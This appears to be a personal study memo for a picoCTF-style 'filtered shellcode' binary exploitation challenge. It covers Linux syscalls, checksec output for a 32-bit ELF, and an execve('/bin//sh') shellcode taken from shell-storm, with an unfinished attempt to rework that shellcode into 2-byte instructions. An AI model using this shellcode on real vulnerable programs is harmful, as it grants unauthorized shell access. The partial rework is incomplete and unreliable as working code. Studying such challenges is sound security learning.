# Lesson
- shellcode  
  - Linux system calls set arguments in registers and are invoked by a software interrupt using "int 0x80".  
    - https://www.mztn.org/lxasm/int80.html  
    - https://www.mztn.org/lxasm/asm04.html  
- system call  
  - https://os.pubpub.org/pub/blog-1/release/4  
- kernel  
- how to understand a logic  
  - (light) grisp the overview with gdb  
  - (heavy) read code manually  

# Memo
1. check  
```zsh
$ file fun
fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325e35378982f451f374c7140c5249bb1c52ab18, not stripped
$
$ checksec --file=./fun --output=json | jq .
{
  "./fun": {
    "relro": "partial",
    "canary": "no",
    "nx": "no",
    "pie": "no",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "0"
  }
}
```

2. ghidra  

3. create shellcode  
https://shell-storm.org/shellcode/files/shellcode-517.html  
```
"\x31\xc9"                  // xor    %ecx,%ecx
"\xf7\xe1"                  // mul    %ecx
"\x51"                      // push   %ecx
"\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
"\x89\xe3"                  // mov    %esp,%ebx
"\xb0\x0b"                  // mov    $0xb,%al
"\xcd\x80"                  // int    $0x80
```
2 byte
```zsh
$ pwn asm -c 32 nop
90
$ pwn asm -c 32 "nop;nop"
9090
$ pwn asm -c 32 "push eax"
50
```
```
"\x31\xc9"                  // xor    %ecx,%ecx
"\xf7\xe1"                  // mul    %ecx
"\x51"                      // push   %ecx

"\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f

mov al, 0x62                     #writes 'b' on the lowes byte of the eax 2nd byte of the stack 
add [edi], al
inc edi
nop

mov al,

push eax


"\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f

"\x89\xe3"                  // mov    %esp,%ebx
"\xb0\x0b"                  // mov    $0xb,%al
"\xcd\x80"                  // int    $0x80
```

# Ref
- https://cyb3rwhitesnake.medium.com/picoctf-filtered-shellcode-pwn-3d69010376df  
- https://sh0ebill.hatenablog.com/entry/2022/11/13/204614  
- https://zenn.dev/t0m3y/scraps/275ba361c564c8  
